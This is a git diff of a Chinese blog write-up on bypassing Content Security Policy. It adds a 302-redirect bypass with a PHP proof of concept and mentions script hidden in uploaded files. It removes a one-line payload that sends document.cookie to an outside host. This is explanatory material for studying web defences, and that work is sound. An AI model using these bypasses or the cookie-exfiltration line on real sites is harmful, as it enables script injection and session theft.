@@ -1,7 +1,7 @@
 ---
 layout:		post
 title:		Bypass CSP
-data:		2016-11-01
+data:		2016-12-08
 author:		"dogewatch"
 header-img:	"img/post-bg-2015.jpg"
 tags:
@@ -85,9 +85,41 @@ HTML5页面预加载是用link标签的rel属性来指定的。如果csp头有`u
 
 9. 打开了chrome developer tools开发工具
 
-## 0x2 一些其他特性 
+## 0x2 302跳转
 
-   利用javascript或者某些标签的某种特性可以绕过`unsafe-inline`向外界发出请求。
+今年XCTF第一站杭电的HCTF里有一道题利用了302跳转来绕过CSP限制，当时并不知道这个点，所以下来之后再研究一下。
+
+对于302跳转绕过CSP而言，实际上有以下几点限制：
+
+1. “跳板”必须在允许的域内。
+
+2. 要加载的文件的host部分必须跟允许的域的host部分一致，例如csp头内容是`script-src http://abc.xyz/asdf`，那么要加载的文件必须位于http://abc.xyz下，路径可以是`http://abc.xy/xxx/xx`
+
+   举个例子，新建一个php，代码如下：
+
+```php+HTML
+<?php
+  header("Content-Security-Policy: default-src 'self' script-src 'self' http://x.x.x.x/asdf);
+?>
+<html>
+<script src="http://127.0.0.1/test/302.php?http://x.x.x.x/test/1.js">
+</script>
+</html>
+```
+
+然后再建一个用来跳转的php，在另一台服务器上，在test目录下建一个js我呢见，内容是`alert(1)`。结果成功弹窗：
+
+![img](/img/post/csp-1.png)
+
+可以试一下是不是通过跳转加载任意服务器上的文件，我们将csp头修改成`default-src 'self'`，结果如图，触发了浏览器的拦截。
+
+![img](/img/post/csp-2.png)
+
+由此可见，CSP规则在跳转之后路径部分的限制消失了，但是host部分的限制依然存在。适用场景就是假如某网站调用的某个外部站点可以上传文件，同时它自身又刚好有个重定向，则满足漏洞利用的条件
+
+## 0x3 一些其他特性 
+
+  利用javascript或者某些标签的某种特性可以绕过`unsafe-inline`向外界发出请求。
 
 1. jQuery sourcemap
 
@@ -105,11 +137,4 @@ HTML5页面预加载是用link标签的rel属性来指定的。如果csp头有`u
    a.click();
    ```
 
-3. http 204
-
-   ```javascript
-   location='//www.google.com/csi?' + escape(document.cookie);
-   ```
-
-   ​
-
+3. 利用上传点，在上传的文件(如jpeg)中写javascript代码(chrome不行)。
